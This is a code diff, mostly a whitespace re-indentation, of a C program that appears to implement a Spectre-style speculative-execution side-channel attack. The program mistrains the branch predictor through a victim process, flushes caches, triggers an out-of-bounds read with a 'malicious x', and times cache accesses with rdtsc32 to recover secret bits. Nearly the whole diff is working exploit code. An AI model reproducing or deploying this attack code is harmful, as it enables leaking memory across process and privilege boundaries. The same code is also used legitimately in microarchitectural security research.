@@ -72,9 +72,9 @@ int main(void){
 	for(i=0;i<OOB_READ;i++){
 		for(j=0;j<N_OF_BITS;j++){
 			timings[i][j][0]=0;
-            timings[i][j][1]=0;
-        }
-    }
+            		timings[i][j][1]=0;
+        	}
+    	}
 	//mmap and pipes setup
 	ptr = mmap(NULL, (ARRAY2_SIZE+SPACE_FOR_PARAMS), PROT_READ | PROT_WRITE, MAP_SHARED | MAP_ANONYMOUS, 0, 0);
 	if(ptr==MAP_FAILED){
@@ -127,178 +127,163 @@ int main(void){
 
 				for(j=0;j<SAME_BIT_CYCLES;j++){ // to reread the bit multiple times, just to be safe
 
-            k=0;
-            memcpy(&ptr[ARRAY2_SIZE],&k,sizeof(int)); // to copy the value of k in the shared memory
-            memcpy(&ptr[ARRAY2_SIZE+4],&m,sizeof(long int)); //to copy the value of m in the shared memory
-            write(A2Vpipe_ptr[1],&placeholder,1);
-            read(V2Apipe_ptr[0],&buf,1); //NULL or character placeholder?
-            k++;
-            memcpy(&ptr[ARRAY2_SIZE],&k,sizeof(int)); // to copy the value of k in the shared memory
-            memcpy(&ptr[ARRAY2_SIZE+4],&m,sizeof(long int)); //to copy the value of m in the shared memory
-            write(A2Vpipe_ptr[1],&placeholder,1);
-            read(V2Apipe_ptr[0],&buf,1);
-            k++;
-            memcpy(&ptr[ARRAY2_SIZE],&k,sizeof(int)); // to copy the value of k in the shared memory
-            memcpy(&ptr[ARRAY2_SIZE+4],&m,sizeof(long int)); //to copy the value of m in the shared memory
-            write(A2Vpipe_ptr[1],&placeholder,1);
-            read(V2Apipe_ptr[0],&buf,1);
-            k++;
-            memcpy(&ptr[ARRAY2_SIZE],&k,sizeof(int)); // to copy the value of k in the shared memory
-            memcpy(&ptr[ARRAY2_SIZE+4],&m,sizeof(long int)); //to copy the value of m in the shared memory
-            write(A2Vpipe_ptr[1],&placeholder,1);
-            read(V2Apipe_ptr[0],&buf,1);
-            k++;
-            memcpy(&ptr[ARRAY2_SIZE],&k,sizeof(int)); // to copy the value of k in the shared memory
-            memcpy(&ptr[ARRAY2_SIZE+4],&m,sizeof(long int)); //to copy the value of m in the shared memory
-            write(A2Vpipe_ptr[1],&placeholder,1);
-            read(V2Apipe_ptr[0],&buf,1); //NULL or character placeholder?
-            k++;
-            memcpy(&ptr[ARRAY2_SIZE],&k,sizeof(int)); // to copy the value of k in the shared memory
-            memcpy(&ptr[ARRAY2_SIZE+4],&m,sizeof(long int)); //to copy the value of m in the shared memory
-            write(A2Vpipe_ptr[1],&placeholder,1);
-            read(V2Apipe_ptr[0],&buf,1); //NULL or character placeholder?
-            k++;
-            memcpy(&ptr[ARRAY2_SIZE],&k,sizeof(int)); // to copy the value of k in the shared memory
-            memcpy(&ptr[ARRAY2_SIZE+4],&m,sizeof(long int)); //to copy the value of m in the shared memory
-            write(A2Vpipe_ptr[1],&placeholder,1);
-            read(V2Apipe_ptr[0],&buf,1); //NULL or character placeholder?
-            k++;
-            memcpy(&ptr[ARRAY2_SIZE],&k,sizeof(int)); // to copy the value of k in the shared memory
-            memcpy(&ptr[ARRAY2_SIZE+4],&m,sizeof(long int)); //to copy the value of m in the shared memory
-            write(A2Vpipe_ptr[1],&placeholder,1);
-            read(V2Apipe_ptr[0],&buf,1); //NULL or character placeholder?
-            k++;
-            memcpy(&ptr[ARRAY2_SIZE],&k,sizeof(int)); // to copy the value of k in the shared memory
-            memcpy(&ptr[ARRAY2_SIZE+4],&m,sizeof(long int)); //to copy the value of m in the shared memory
-            write(A2Vpipe_ptr[1],&placeholder,1);
-            read(V2Apipe_ptr[0],&buf,1); //NULL or character placeholder?
-            k++;
-            memcpy(&ptr[ARRAY2_SIZE],&k,sizeof(int)); // to copy the value of k in the shared memory
-            memcpy(&ptr[ARRAY2_SIZE+4],&m,sizeof(long int)); //to copy the value of m in the shared memory
-            write(A2Vpipe_ptr[1],&placeholder,1);
-            read(V2Apipe_ptr[0],&buf,1); //NULL or character placeholder?
-            k++;
-            memcpy(&ptr[ARRAY2_SIZE],&k,sizeof(int)); // to copy the value of k in the shared memory
-            memcpy(&ptr[ARRAY2_SIZE+4],&m,sizeof(long int)); //to copy the value of m in the shared memory
-            write(A2Vpipe_ptr[1],&placeholder,1);
-            read(V2Apipe_ptr[0],&buf,1); //NULL or character placeholder?
-            k++;
-            memcpy(&ptr[ARRAY2_SIZE],&k,sizeof(int)); // to copy the value of k in the shared memory
-            memcpy(&ptr[ARRAY2_SIZE+4],&m,sizeof(long int)); //to copy the value of m in the shared memory
-            write(A2Vpipe_ptr[1],&placeholder,1);
-            read(V2Apipe_ptr[0],&buf,1); //NULL or character placeholder?
-            k++;
-            memcpy(&ptr[ARRAY2_SIZE],&k,sizeof(int)); // to copy the value of k in the shared memory
-            memcpy(&ptr[ARRAY2_SIZE+4],&m,sizeof(long int)); //to copy the value of m in the shared memory
-            write(A2Vpipe_ptr[1],&placeholder,1);
-            read(V2Apipe_ptr[0],&buf,1); //NULL or character placeholder?
+				    k=0;
+				    memcpy(&ptr[ARRAY2_SIZE],&k,sizeof(int)); // to copy the value of k in the shared memory
+				    memcpy(&ptr[ARRAY2_SIZE+4],&m,sizeof(long int)); //to copy the value of m in the shared memory
+				    write(A2Vpipe_ptr[1],&placeholder,1);
+				    read(V2Apipe_ptr[0],&buf,1); //NULL or character placeholder?
+				    k++;
+				    memcpy(&ptr[ARRAY2_SIZE],&k,sizeof(int)); // to copy the value of k in the shared memory
+				    memcpy(&ptr[ARRAY2_SIZE+4],&m,sizeof(long int)); //to copy the value of m in the shared memory
+				    write(A2Vpipe_ptr[1],&placeholder,1);
+				    read(V2Apipe_ptr[0],&buf,1);
+				    k++;
+				    memcpy(&ptr[ARRAY2_SIZE],&k,sizeof(int)); // to copy the value of k in the shared memory
+				    memcpy(&ptr[ARRAY2_SIZE+4],&m,sizeof(long int)); //to copy the value of m in the shared memory
+				    write(A2Vpipe_ptr[1],&placeholder,1);
+				    read(V2Apipe_ptr[0],&buf,1);
+				    k++;
+				    memcpy(&ptr[ARRAY2_SIZE],&k,sizeof(int)); // to copy the value of k in the shared memory
+				    memcpy(&ptr[ARRAY2_SIZE+4],&m,sizeof(long int)); //to copy the value of m in the shared memory
+				    write(A2Vpipe_ptr[1],&placeholder,1);
+				    read(V2Apipe_ptr[0],&buf,1);
+				    k++;
+				    memcpy(&ptr[ARRAY2_SIZE],&k,sizeof(int)); // to copy the value of k in the shared memory
+				    memcpy(&ptr[ARRAY2_SIZE+4],&m,sizeof(long int)); //to copy the value of m in the shared memory
+				    write(A2Vpipe_ptr[1],&placeholder,1);
+				    read(V2Apipe_ptr[0],&buf,1); //NULL or character placeholder?
+				    k++;
+				    memcpy(&ptr[ARRAY2_SIZE],&k,sizeof(int)); // to copy the value of k in the shared memory
+				    memcpy(&ptr[ARRAY2_SIZE+4],&m,sizeof(long int)); //to copy the value of m in the shared memory
+				    write(A2Vpipe_ptr[1],&placeholder,1);
+				    read(V2Apipe_ptr[0],&buf,1); //NULL or character placeholder?
+				    k++;
+				    memcpy(&ptr[ARRAY2_SIZE],&k,sizeof(int)); // to copy the value of k in the shared memory
+				    memcpy(&ptr[ARRAY2_SIZE+4],&m,sizeof(long int)); //to copy the value of m in the shared memory
+				    write(A2Vpipe_ptr[1],&placeholder,1);
+				    read(V2Apipe_ptr[0],&buf,1); //NULL or character placeholder?
+				    k++;
+				    memcpy(&ptr[ARRAY2_SIZE],&k,sizeof(int)); // to copy the value of k in the shared memory
+				    memcpy(&ptr[ARRAY2_SIZE+4],&m,sizeof(long int)); //to copy the value of m in the shared memory
+				    write(A2Vpipe_ptr[1],&placeholder,1);
+				    read(V2Apipe_ptr[0],&buf,1); //NULL or character placeholder?
+				    k++;
+				    memcpy(&ptr[ARRAY2_SIZE],&k,sizeof(int)); // to copy the value of k in the shared memory
+				    memcpy(&ptr[ARRAY2_SIZE+4],&m,sizeof(long int)); //to copy the value of m in the shared memory
+				    write(A2Vpipe_ptr[1],&placeholder,1);
+				    read(V2Apipe_ptr[0],&buf,1); //NULL or character placeholder?
+				    k++;
+				    memcpy(&ptr[ARRAY2_SIZE],&k,sizeof(int)); // to copy the value of k in the shared memory
+				    memcpy(&ptr[ARRAY2_SIZE+4],&m,sizeof(long int)); //to copy the value of m in the shared memory
+				    write(A2Vpipe_ptr[1],&placeholder,1);
+				    read(V2Apipe_ptr[0],&buf,1); //NULL or character placeholder?
+				    k++;
+				    memcpy(&ptr[ARRAY2_SIZE],&k,sizeof(int)); // to copy the value of k in the shared memory
+				    memcpy(&ptr[ARRAY2_SIZE+4],&m,sizeof(long int)); //to copy the value of m in the shared memory
+				    write(A2Vpipe_ptr[1],&placeholder,1);
+				    read(V2Apipe_ptr[0],&buf,1); //NULL or character placeholder?
+				    k++;
+				    memcpy(&ptr[ARRAY2_SIZE],&k,sizeof(int)); // to copy the value of k in the shared memory
+				    memcpy(&ptr[ARRAY2_SIZE+4],&m,sizeof(long int)); //to copy the value of m in the shared memory
+				    write(A2Vpipe_ptr[1],&placeholder,1);
+				    read(V2Apipe_ptr[0],&buf,1); //NULL or character placeholder?
+				    k++;
+				    memcpy(&ptr[ARRAY2_SIZE],&k,sizeof(int)); // to copy the value of k in the shared memory
+				    memcpy(&ptr[ARRAY2_SIZE+4],&m,sizeof(long int)); //to copy the value of m in the shared memory
+				    write(A2Vpipe_ptr[1],&placeholder,1);
+				    read(V2Apipe_ptr[0],&buf,1); //NULL or character placeholder?
 
 
-		memcpy(&ptr[ARRAY2_SIZE],&x,sizeof(int)); // to copy the value of k in the shared memory
-		memcpy(&ptr[ARRAY2_SIZE+4],&m,sizeof(long int)); //to copy the value of m in the shared memory
+				    memcpy(&ptr[ARRAY2_SIZE],&x,sizeof(int)); // to copy the value of k in the shared memory
+				    memcpy(&ptr[ARRAY2_SIZE+4],&m,sizeof(long int)); //to copy the value of m in the shared memory
 
-		// Flush the shared memory
-		for(k=0;k<ARRAY2_SIZE+SPACE_FOR_PARAMS;k++) // Flushing array2
-			Flush(&ptr[k]);
+				    // Flush the shared memory
+				    for(k=0;k<ARRAY2_SIZE+SPACE_FOR_PARAMS;k++) // Flushing array2
+					Flush(&ptr[k]);
 
-		//Flush everything else
-		for(k=0;k<ARRAY_SIZE;k++)
-			Flush(&array1[k]); // we still flush it for safety, probably there is no need because it contains dummy data for the father that are never accessed
+				    //Flush everything else
+				    for(k=0;k<ARRAY_SIZE;k++)
+					Flush(&array1[k]); // we still flush it for safety, probably there is no need because it contains dummy data for the father that are never accessed
 
-		for(k=0;k<OOB_READ;k++)
-			for(l=0;l<N_OF_BITS;l++){
-				Flush(&timings[k][l][0]);
-				Flush(&timings[k][l][1]);
-			}
-
-		// array1_size must be known by the father because it needs to issue requests for the mistraining
-		Flush(&array1_size);
-					
-//		asm volatile(	"nop				\t\n");
-		asm volatile(	"nop				\t\n");
-		asm volatile(	"cmn sp,#0			\t\n"
-				"beq 8			 	\t\n"
-				"nop				\t\n"
-															 );
-
-					asm volatile(	"cmn sp,#0			\t\n"
-									"beq 8		 		\t\n"
-									"nop				\t\n"
-															 );
-
-					asm volatile(	"cmn sp,#0			\t\n"
-									"beq 8		 		\t\n"
-									"nop				\t\n"
-															 );
-
-					asm volatile(	"cmn sp,#0			\t\n"
-									"beq 8		 		\t\n"
-									"nop				\t\n"
-															 );
-
-					asm volatile(	"cmn sp,#0			\t\n"
-									"beq 8		 		\t\n"
-									"nop				\t\n"
-															 );
-
-					asm volatile(	"cmn sp,#0			\t\n"
-									"beq 8		 		\t\n"
-									"nop				\t\n"
-															 );
-
-					asm volatile(	"cmn sp,#0			\t\n"
-									"beq 8		 		\t\n"
-									"nop				\t\n"
-															 );
-
-					asm volatile(	"cmn sp,#0			\t\n"
-									"beq 8		 		\t\n"
-									"nop				\t\n"
-															 );
-
-					asm volatile(	"cmn sp,#0			\t\n"
-									"beq 8		 		\t\n"
-									"nop				\t\n"
-															 );
-
-					asm volatile(	"cmn sp,#0			\t\n"
-									"beq 8		 		\t\n"
-									"nop				\t\n"
-															 );
-
-					asm volatile(	"cmn sp,#0			\t\n"
-									"beq 8		 		\t\n"
-									"nop				\t\n"
-															 );
-
-					asm volatile(	"cmn sp,#0			\t\n"
-									"beq 8		 		\t\n"
-									"nop				\t\n"
-															 );
-
-					asm volatile(	"cmn sp,#0			\t\n"
-									"beq 8		 		\t\n"
-									"nop				\t\n"
-															 );
-
-
-					
-					
-				// Call using malicious x
-					write(A2Vpipe_ptr[1],&placeholder,1);
-					read(V2Apipe_ptr[0],&buf,1); //NULL or character placeholder?
-
-				// Side channel exploitation
-					for(k=0;k<2;k++){
-						// Non-cached read
-						addr = &ptr[k*LINE_DISTANCE];
-						start=rdtsc32();
-						junk &= *addr;
-						end=rdtsc32();
-						timings[i][m][k]+=end-start;
+				    for(k=0;k<OOB_READ;k++)
+					for(l=0;l<N_OF_BITS;l++){
+						Flush(&timings[k][l][0]);
+						Flush(&timings[k][l][1]);
 					}
+
+				    // array1_size must be known by the father because it needs to issue requests for the mistraining
+				    Flush(&array1_size);
+
+				    //	    asm volatile(	"nop				\t\n");
+				    asm volatile(	"nop				\t\n");
+				    asm volatile(	"cmn sp,#0			\t\n"
+							"beq 8			 	\t\n"
+							"nop				\t\n"
+											     );
+				    asm volatile(	"cmn sp,#0			\t\n"
+							"beq 8		 		\t\n"
+							"nop				\t\n"
+						       					     );
+				    asm volatile(	"cmn sp,#0			\t\n"
+							"beq 8		 		\t\n"
+							"nop				\t\n"
+											     );
+				    asm volatile(	"cmn sp,#0			\t\n"
+							"beq 8		 		\t\n"
+							"nop				\t\n"
+											     );
+				    asm volatile(	"cmn sp,#0			\t\n"
+							"beq 8		 		\t\n"
+							"nop				\t\n"
+											     );
+				    asm volatile(	"cmn sp,#0			\t\n"
+							"beq 8		 		\t\n"
+							"nop				\t\n"
+											     );
+				    asm volatile(	"cmn sp,#0			\t\n"
+							"beq 8		 		\t\n"
+							"nop				\t\n"
+											     );
+				    asm volatile(	"cmn sp,#0			\t\n"
+							"beq 8		 		\t\n"
+							"nop				\t\n"
+											     );
+				    asm volatile(	"cmn sp,#0			\t\n"
+							"beq 8		 		\t\n"
+							"nop				\t\n"
+											     );
+				    asm volatile(	"cmn sp,#0			\t\n"
+							"beq 8		 		\t\n"
+							"nop				\t\n"
+											     );
+				    asm volatile(	"cmn sp,#0			\t\n"
+							"beq 8		 		\t\n"
+							"nop				\t\n"
+											     );
+				    asm volatile(	"cmn sp,#0			\t\n"
+							"beq 8		 		\t\n"
+							"nop				\t\n"
+											     );
+				    asm volatile(	"cmn sp,#0			\t\n"
+							"beq 8		 		\t\n"
+							"nop				\t\n"
+											     );
+
+				    // Call using malicious x
+				    write(A2Vpipe_ptr[1],&placeholder,1);
+				    read(V2Apipe_ptr[0],&buf,1); //NULL or character placeholder?
+
+				    // Side channel exploitation
+				    for(k=0;k<2;k++){
+					// Non-cached read
+					addr = &ptr[k*LINE_DISTANCE];
+					start=rdtsc32();
+					junk &= *addr;
+					end=rdtsc32();
+					timings[i][m][k]+=end-start;
+				    }
 				}
-			// Avg timing for each cache line read (trying to detect a threshold between cached and not cached)
+				// Avg timing for each cache line read (trying to detect a threshold between cached and not cached)
 				fprintf(fout,"BIT %d: ",m);
 				for(k=0;k<2;k++){
 					timings[i][m][k]/=SAME_BIT_CYCLES;
